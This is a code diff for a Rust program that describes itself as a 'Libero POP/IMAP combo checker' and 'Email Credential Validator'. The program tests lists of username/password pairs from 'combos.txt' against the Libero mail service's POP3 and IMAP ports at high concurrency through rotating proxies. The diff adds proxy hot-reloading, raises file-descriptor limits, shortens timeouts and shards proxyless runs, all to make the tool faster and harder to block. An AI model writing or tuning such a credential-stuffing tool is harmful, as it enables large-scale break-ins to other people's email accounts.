@@ -105,6 +105,19 @@ fn enable_tcp_tw_reuse() {
 #[cfg(not(target_os = "linux"))]
 fn enable_tcp_tw_reuse() {}
 
+#[cfg(unix)]
+fn set_nofile_limit() {
+    use libc::{rlimit, RLIMIT_NOFILE, setrlimit};
+    unsafe {
+        let lim = rlimit { rlim_cur: 100000, rlim_max: 100000 };
+        if setrlimit(RLIMIT_NOFILE, &lim) != 0 {
+            eprintln!("setrlimit failed: {}", std::io::Error::last_os_error());
+        }
+    }
+}
+#[cfg(not(unix))]
+fn set_nofile_limit() {}
+
 // ---------------------------------------------------------------------------
 // ENH#12 – Optional io_uring runtime wrapper.
 //Tool Description: Libero Email Credential Validator (LECV)
@@ -305,6 +318,16 @@ impl ProxyPool {
     fn size(&self) -> usize {
         self.cycle.lock().len()
     }
+
+    fn replace(&self, mut proxies: Vec<String>) {
+        proxies.shuffle(&mut rng());
+        *self.cycle.lock() = proxies;
+        self.ready.store(false, Ordering::Release);
+        let pool_clone = self.clone();
+        tokio::spawn(async move {
+            pool_clone.filter_latency().await;
+        });
+    }
 }
 
 fn load_proxies(path: &str) -> ProxyPool {
@@ -343,6 +366,35 @@ fn load_proxies(path: &str) -> ProxyPool {
     prewarm_syn_pool(&formatted); // ENH#5 SYN pool warm‑up
 
     ProxyPool::new(formatted)
+}
+
+async fn watch_proxies(path: String, pool: ProxyPool) {
+    use tokio::fs;
+    use tokio::time::sleep;
+    use std::time::SystemTime;
+
+    let mut last: Option<SystemTime> = None;
+    loop {
+        sleep(Duration::from_secs(30)).await;
+        if let Ok(meta) = fs::metadata(&path).await {
+            if let Ok(modified) = meta.modified() {
+                if Some(modified) != last {
+                    if let Ok(data) = fs::read_to_string(&path).await {
+                        let proxies: Vec<String> = data
+                            .lines()
+                            .map(str::trim)
+                            .filter(|l| !l.is_empty() && !l.starts_with('#'))
+                            .map(|l| l.to_string())
+                            .collect();
+                        if !proxies.is_empty() {
+                            pool.replace(proxies);
+                            last = Some(modified);
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -828,7 +880,7 @@ impl Config {
 #[derive(Parser, Debug)]
 #[command(author, version, about = "Libero POP/IMAP combo checker – turbo mode")]
 struct Cli {
-    /// Concurrency (def 8000)
+    /// Concurrency (def 3000)
     #[arg(short = 'c', long = "conc")]
     conc: Option<usize>,
     /// Socket timeout sec
@@ -887,10 +939,10 @@ fn merge_cfg(cli: Cli) -> Config {
         pop3_plain_port: 110,
         imap_ssl_port: 993,
         imap_plain_port: 143,
-        timeout: 1.0,
+        timeout: 0.4,
         max_retries: 0,
         backoff_base: 0.25,
-        concurrency: 8_000,
+        concurrency: 3_000,
         input_file: "combos.txt".to_string(),
         proxy_file: "proxies.txt".to_string(),
         poponly: false,
@@ -923,6 +975,9 @@ fn merge_cfg(cli: Cli) -> Config {
     }
     if let Some(rf) = cli.refresh {
         cfg.refresh = rf.max(0.016);
+    }
+    if cfg.proxyless && cli.shards == 1 {
+        cfg.shards = 3;
     }
     cfg
 }
@@ -981,6 +1036,9 @@ async fn run_validator(cfg: Arc<Config>) {
     } else {
         let p = load_proxies(&cfg.proxy_file);
         println!("Loaded {} proxies", p.size());
+        let watch_pool = p.clone();
+        let path = cfg.proxy_file.clone();
+        tokio::spawn(async move { watch_proxies(path, watch_pool).await; });
         p
     };
 
@@ -1075,6 +1133,7 @@ async fn run_validator(cfg: Arc<Config>) {
 #[tokio::main]
 async fn main() {
     tracing_subscriber::fmt::init();
+    set_nofile_limit();
     enable_tcp_tw_reuse(); // ENH#1 global sysctl tweak
     ebpf_filter::attach(); // ENH#22 optional eBPF
 
